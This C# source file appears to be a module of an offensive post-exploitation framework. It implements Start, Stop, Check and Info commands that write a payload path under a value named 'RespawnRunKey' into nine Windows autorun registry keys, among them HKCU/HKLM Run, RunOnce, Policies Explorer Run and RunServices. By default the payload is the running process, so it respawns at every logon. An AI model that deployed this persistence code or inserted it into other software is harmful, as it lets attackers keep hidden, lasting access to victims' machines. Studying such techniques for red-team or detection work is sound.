using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string DefaultValueName = "RespawnRunKey";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 run Start {DefaultValueName} hkcu-run {defaultPayload}\n" +
                   $"    (Target Keys: 'hkcu-run', 'hkcu-runonce', 'hkcu-policies-run', 'hkcu-run-services',\n" +
                   $"                  'hklm-run', 'hklm-runonce', 'hklm-run32', 'hklm-policies-run', 'hklm-run-services')";
        }

        public static string Start(string[] args)
        {
            string valueName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultValueName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-run";

            string payloadPath = (args != null && args.Length > 2 && !string.IsNullOrWhiteSpace(args[2]))
                ? args[2]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = OpenForWrite(targetKey, create: true);
                if (regKey == null)
                    return $"[-] Access denied opening or creating registry hive path for '{targetKey}'.";

                var existing = regKey.GetValue(valueName);
                if (existing != null)
                    return $"[*] Value '{valueName}' already exists under '{targetKey}'. Current: '{existing}'";

                regKey.SetValue(valueName, payloadPath, RegistryValueKind.String);
                return $"[+] Successfully Installed '{valueName}' in '{targetKey.ToUpper()}' -> Payload: '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return $"[-] Access denied. Modifying '{targetKey}' requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string valueName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultValueName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-run";

            try
            {
                using var regKey = OpenForWrite(targetKey, create: false);
                if (regKey == null)
                    return $"[-] Target registry path '{targetKey}' not found or inaccessible.";

                var existing = regKey.GetValue(valueName);
                if (existing == null)
                    return $"[*] Value entry '{valueName}' does not exist inside '{targetKey}'.";

                regKey.DeleteValue(valueName, throwOnMissingValue: false);
                return $"[+] Successfully removed value entry '{valueName}' from '{targetKey.ToUpper()}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return $"[-] Access denied. Removing values from '{targetKey}' requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string valueName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultValueName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-run";

            try
            {
                using var regKey = OpenForRead(targetKey);
                if (regKey == null)
                    return $"[-] Target registry path '{targetKey}' could not be located.";

                var value = regKey.GetValue(valueName)?.ToString();
                if (value == null)
                    return $"[*] Value entry '{valueName}' not found in '{targetKey.ToUpper()}'.";

                return $"[+] Verified '{valueName}' in '{targetKey.ToUpper()}' -> '{value}'";
            }
            catch (UnauthorizedAccessException)
            {
                return $"[-] Access denied reading registry parameters from '{targetKey}'.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        // ─── Path Resolution Engine ───────────────────────────────────────────────

        private static RegistryKey OpenForWrite(string keyId, bool create)
        {
            var (hive, path) = ResolvePath(keyId);
            return create
                ? hive.CreateSubKey(path, writable: true)
                : hive.OpenSubKey(path, writable: true);
        }

        private static RegistryKey OpenForRead(string keyId)
        {
            var (hive, path) = ResolvePath(keyId);
            return hive.OpenSubKey(path, writable: false);
        }

        private static (RegistryKey hive, string path) ResolvePath(string keyId)
        {
            return (keyId ?? string.Empty).ToLower() switch
            {
                "hkcu-run"          => (Registry.CurrentUser,  @"Software\Microsoft\Windows\CurrentVersion\Run"),
                "hkcu-runonce"      => (Registry.CurrentUser,  @"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                "hkcu-policies-run" => (Registry.CurrentUser,  @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                "hkcu-run-services" => (Registry.CurrentUser,  @"Software\Microsoft\Windows\CurrentVersion\RunServices"),
                "hklm-run"          => (Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\Run"),
                "hklm-runonce"      => (Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                "hklm-run32"        => (Registry.LocalMachine, @"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
                "hklm-policies-run" => (Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                "hklm-run-services" => (Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\RunServices"),
                _                   => (Registry.CurrentUser,  @"Software\Microsoft\Windows\CurrentVersion\Run")
            };
        }
    }
}